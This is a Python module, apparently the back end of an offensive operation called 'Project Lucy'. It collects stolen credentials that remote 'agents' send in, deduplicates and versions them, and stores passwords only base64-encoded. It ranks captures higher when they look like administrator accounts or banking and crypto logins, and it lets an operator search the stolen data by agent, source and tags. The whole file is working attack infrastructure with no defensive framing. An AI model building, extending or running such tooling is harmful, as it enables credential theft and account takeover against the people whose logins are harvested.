"""
Credential harvesting pipeline for Project Lucy.
Handles deduplication, scoring, versioning, and encrypted storage.
"""
import base64
import json
import logging
from datetime import datetime, timezone
from typing import Optional

from database import database
from db.models import Credential

logger = logging.getLogger(__name__)

ADMIN_KEYWORDS = {"admin", "root", "administrator", "sudo", "superuser", "sa", "dba"}
BANKING_KEYWORDS = {"bank", "paypal", "stripe", "finance", "wallet", "crypto", "btc", "eth"}


class CredentialManager:
    _instance: Optional["CredentialManager"] = None

    def __new__(cls) -> "CredentialManager":
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance

    def ingest(self, agent_id: str, source: str, credentials: list[dict]) -> dict:
        """
        Ingest a batch of credentials from an agent.
        Deduplicates and stores each one.
        Returns counts of new/duplicate/total.
        """
        new_count = 0
        dup_count = 0

        for cred in credentials:
            url      = cred.get("url") or cred.get("host") or ""
            username = cred.get("username") or ""
            password = cred.get("password") or cred.get("value") or ""

            dedup = Credential.compute_dedup_hash(url, username)

            existing = Credential.get_or_none(Credential.dedup_hash == dedup)
            if existing:
                with database:
                    Credential.update(
                        version=existing.version + 1,
                        captured_at=datetime.now(timezone.utc),
                    ).where(Credential.id == existing.id).execute()
                dup_count += 1
                continue

            confidence = self._confidence(url, username, password)
            # Store password as base64 plaintext (no master key available at ingest time)
            password_b64 = base64.b64encode(password.encode("utf-8", errors="replace")).decode()

            with database:
                Credential.create(
                    agent=agent_id,
                    source=source,
                    url=url or None,
                    hostname=cred.get("hostname") or None,
                    username=username,
                    password_encrypted=password_b64,
                    confidence=confidence,
                    tags=json.dumps(cred.get("tags") or []),
                    metadata=json.dumps(cred.get("metadata") or {}),
                    dedup_hash=dedup,
                    version=1,
                )
            new_count += 1

        return {
            "ingested": len(credentials),
            "new": new_count,
            "duplicates": dup_count,
        }

    def _confidence(self, url: str, username: str, password: str) -> str:
        """Derive confidence level from heuristics."""
        score = 0
        if password:
            score += 3
        if any(k in username.lower() for k in ADMIN_KEYWORDS):
            score += 3
        if any(k in url.lower() for k in BANKING_KEYWORDS):
            score += 2
        if len(password) > 20:
            score += 1
        if score >= 5:
            return "high"
        if score >= 2:
            return "medium"
        return "low"

    def search(
        self,
        query: str = "",
        agent_id: str | None = None,
        source: str | None = None,
        tags: str | None = None,
        metadata: str | None = None,
        min_score: int = 0,
        limit: int = 100,
        offset: int = 0,
        match_all_tags: bool = True,
    ) -> list[dict]:
        q = Credential.select().order_by(Credential.captured_at.desc())
        if agent_id:
            q = q.where(Credential.agent == agent_id)
        if source:
            q = q.where(Credential.source == source)
        if min_score:
            # map min_score (0-100) to confidence filter
            if min_score >= 70:
                q = q.where(Credential.confidence == "high")
            elif min_score >= 40:
                q = q.where(Credential.confidence.in_(["high", "medium"]))
        if query:
            q = q.where(
                (Credential.url.contains(query)) |
                (Credential.username.contains(query))
            )

        credentials = [c.to_dict() for c in q.offset(offset).limit(limit)]

        # Post-filter by tags (SQLite does not support JSON arrays easily)
        if tags:
            target_tags = [t.strip().lower() for t in tags.split(",") if t.strip()]
            if target_tags:
                if match_all_tags:
                    credentials = [
                        c for c in credentials
                        if all(t in [x.lower() for x in c.get("tags", [])] for t in target_tags)
                    ]
                else:
                    credentials = [
                        c for c in credentials
                        if any(t in [x.lower() for x in c.get("tags", [])] for t in target_tags)
                    ]

        # Post-filter by metadata key/value pairs
        if metadata:
            try:
                metadata_query = json.loads(metadata)
            except json.JSONDecodeError:
                metadata_query = {}
            if metadata_query:
                credentials = [
                    c for c in credentials
                    if all(c.get("metadata", {}).get(k) == v for k, v in metadata_query.items())
                ]

        return credentials
